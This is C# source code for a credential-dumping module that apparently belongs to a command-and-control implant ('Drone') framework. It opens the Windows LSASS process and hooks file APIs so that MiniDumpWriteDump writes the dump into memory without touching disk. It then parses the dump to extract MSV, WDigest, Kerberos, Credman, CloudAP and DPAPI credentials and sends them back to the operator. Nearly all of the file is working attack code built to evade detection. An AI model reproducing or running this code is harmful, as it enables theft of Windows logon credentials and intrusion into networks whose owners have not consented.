using System.ComponentModel;
using System.Diagnostics;
using System.Runtime.InteropServices;
using Drone.Invocation.DynamicInvoke;
using Drone.Models;
using Drone.Modules;

using MiniDumpModule.Decryptor;
using MiniDumpModule.Streams;
using MiniDumpModule.Templates;

using Data = MiniDumpModule.Invocation.Data;
using Native = MiniDumpModule.Invocation.DynamicInvoke.Native;
using Win32 = MiniDumpModule.Invocation.DynamicInvoke.Win32;

namespace MiniDumpModule;

public class MiniDumpModule : DroneModule
{
    public override string Name => "minidump";

    public override List<Command> Commands => new()
    {
        new Command("minidump", "Dump LSASS via MiniDumpWriteDump", ExecuteMiniDump)
    };

    private readonly IntPtr _canaryHandle = new(0xdeadbeef);

    private DumpContext _dumpContext;
    
    private Win32.Delegates.GetFileSize _getFileSizeOrig;
    private Win32.Delegates.SetFilePointer _setFilePointerOrig;
    private Win32.Delegates.WriteFile _writeFile;

    private void ExecuteMiniDump(DroneTask task, CancellationToken token)
    {
        // get handle to target
        var target = Process.GetProcessesByName("lsass")[0];
        var hProcess = Native.NtOpenProcess((uint)target.Id, Data.Win32.Kernel32.ProcessAccessFlags.PROCESS_ALL_ACCESS);

        if (hProcess == IntPtr.Zero)
        {
            Drone.SendError(task.TaskGuid, "Failed to open handle");
            return;
        }
        
        // add hooks
        EnableHooks();

        // new dump context
        _dumpContext = new DumpContext();

        // execute
        var success = Win32.MiniDumpWriteDump(hProcess, 0, _canaryHandle);

        // unload dll
        var hModule = Generic.GetLoadedModuleAddress("dbgcore.dll");
        Win32.FreeLibrary(hModule);

        // remove hooks
        DisableHooks();
        
        // close handle
        Win32.CloseHandle(hProcess);
        
        // if couldn't dump, return error
        if (!success)
        {
            var e = new Win32Exception(Marshal.GetLastWin32Error());
            Drone.SendError(task.TaskGuid, $"MiniDumpWriteDump failed. {e.Message}.");
            return;
        }

        // if successful, read minidump
        var minidump = new MiniDump();
        using var ms = new MemoryStream(_dumpContext.Data);
        using var br = new BinaryReader(ms);
        minidump.BinaryReader = br;
        minidump.Header = Header.ParseHeader(minidump);
        var directories = Streams.Directory.ParseDirectory(minidump);
        Parse.parseMM(ref minidump, directories);
        minidump.SystemInfo.msv_dll_timestamp = 0;

        foreach (var module in minidump.Modules)
        {
            if (!module.name.Contains("lsasrv.dll")) continue;

            minidump.SystemInfo.msv_dll_timestamp = (int)module.timestamp;
            break;
        }
            
        // lsa
        minidump.LsaKeys = LsaDecryptor.choose(minidump, lsaTemplate.get_template(minidump.SystemInfo));
            
        // sessions
        minidump.LogonList = LogonSessions.FindSessions(minidump, msv.get_template(minidump.SystemInfo));
        minidump.Klogonlist = KerberosSessions.FindSessions(minidump, kerberos.get_template(minidump.SystemInfo));
            
        // credentials
        try { Msv1_.FindCredentials(minidump, msv.get_template(minidump.SystemInfo)); }
        catch { /* ignore */ }
            
        try { WDigest_.FindCredentials(minidump, wdigest.get_template(minidump.SystemInfo)); }
        catch { /* ignore */ }
            
        try { Kerberos_.FindCredentials(minidump, kerberos.get_template(minidump.SystemInfo)); }
        catch { /* ignore */ }
            
        try { Tspkg_.FindCredentials(minidump, tspkg.get_template(minidump.SystemInfo)); }
        catch { /* ignore */ }
            
        try { Credman_.FindCredentials(minidump, credman.get_template(minidump.SystemInfo)); }
        catch { /* ignore */ }
            
        try { Ssp_.FindCredentials(minidump, ssp.get_template(minidump.SystemInfo)); }
        catch { /* ignore */ }
            
        try { Cloudap_.FindCredentials(minidump, cloudap.get_template(minidump.SystemInfo)); }
        catch { /* ignore */ }
            
        try { Dpapi_.FindCredentials(minidump, dpapi.get_template(minidump.SystemInfo)); }
        catch { /* ignore */ }

        var output = Helpers.FormatOutput(minidump);
        Drone.SendResult(task.TaskGuid, output);
    }

    private void EnableHooks()
    {
        _getFileSizeOrig ??= Hooks.CreateHook("kernelbase.dll", "GetFileSize",
            new Win32.Delegates.GetFileSize(GetFileSizeDetour));
        
        _setFilePointerOrig ??= Hooks.CreateHook("kernelbase.dll", "SetFilePointer",
            new Win32.Delegates.SetFilePointer(SetFilePointerDetour));
        
        _writeFile ??= Hooks.CreateHook("kernelbase.dll", "WriteFile",
            new Win32.Delegates.WriteFile(WriteFileDetour));
        
        Hooks.EnableHook(_getFileSizeOrig);
        Hooks.EnableHook(_setFilePointerOrig);
        Hooks.EnableHook(_writeFile);
    }

    private void DisableHooks()
    {
        Hooks.DisableHook(_getFileSizeOrig);
        Hooks.DisableHook(_setFilePointerOrig);
        Hooks.DisableHook(_writeFile);
    }

    private uint GetFileSizeDetour(IntPtr hFile, out uint lpFileSizeHigh)
    {
        if (hFile != _canaryHandle)
            return _getFileSizeOrig(hFile, out lpFileSizeHigh);

        lpFileSizeHigh = 0;
        return _dumpContext.Size;
    }

    private uint SetFilePointerDetour(IntPtr hFile, uint liDistanceToMove, IntPtr lpNewFilePointer,
        Win32.Delegates.MOVE_METHOD dwMoveMethod)
    {
        if (hFile != _canaryHandle)
            return _setFilePointerOrig(hFile, liDistanceToMove, lpNewFilePointer, dwMoveMethod);

        switch (dwMoveMethod)
        {
            case Win32.Delegates.MOVE_METHOD.FILE_BEGIN:
                _dumpContext.CurrentOffset = liDistanceToMove;
                break;

            case Win32.Delegates.MOVE_METHOD.FILE_CURRENT:
                _dumpContext.CurrentOffset += liDistanceToMove;
                break;

            case Win32.Delegates.MOVE_METHOD.FILE_END:
                _dumpContext.CurrentOffset = _dumpContext.Size + liDistanceToMove;
                break;

            default:
                throw new ArgumentOutOfRangeException(nameof(dwMoveMethod), dwMoveMethod, null);
        }

        return _dumpContext.CurrentOffset;
    }

    private bool WriteFileDetour(IntPtr hFile, IntPtr lpBuffer, uint nNumberOfBytesToWrite,
        out uint lpNumberOfBytesWritten, IntPtr lpOverlapped)
    {
        if (hFile != _canaryHandle)
            return _writeFile(hFile, lpBuffer, nNumberOfBytesToWrite, out lpNumberOfBytesWritten, lpOverlapped);

        if (_dumpContext.CurrentOffset + nNumberOfBytesToWrite > _dumpContext.Data.Length)
            _dumpContext.Resize(_dumpContext.CurrentOffset + nNumberOfBytesToWrite);

        Marshal.Copy(lpBuffer, _dumpContext.Data, (int)_dumpContext.CurrentOffset, (int)nNumberOfBytesToWrite);
        _dumpContext.CurrentOffset += nNumberOfBytesToWrite;

        lpNumberOfBytesWritten = nNumberOfBytesToWrite;

        var growth = _dumpContext.CurrentOffset - _dumpContext.Size;
        if (growth > 0)
            _dumpContext.Size += growth;

        return true;
    }
}